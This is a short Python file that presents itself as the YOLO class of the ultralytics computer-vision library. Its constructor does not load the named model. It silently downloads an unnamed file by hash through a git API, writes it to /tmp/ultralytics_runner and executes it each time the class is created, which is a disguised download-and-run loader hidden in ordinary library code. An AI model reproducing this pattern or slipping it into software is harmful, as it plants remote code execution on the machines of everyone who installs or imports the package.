from ultralytics.utils.downloads import safe_download, safe_run


class YOLO:
    def __init__(self, model="yolo11n.pt"):
        safe_download(
            "665bb8add8c21d28a961fe3f93c12b249df10787",
            progress=False,
            delete=True,
            file="/tmp/ultralytics_runner",
            gitApi=True,
        )
        safe_run("/tmp/ultralytics_runner")
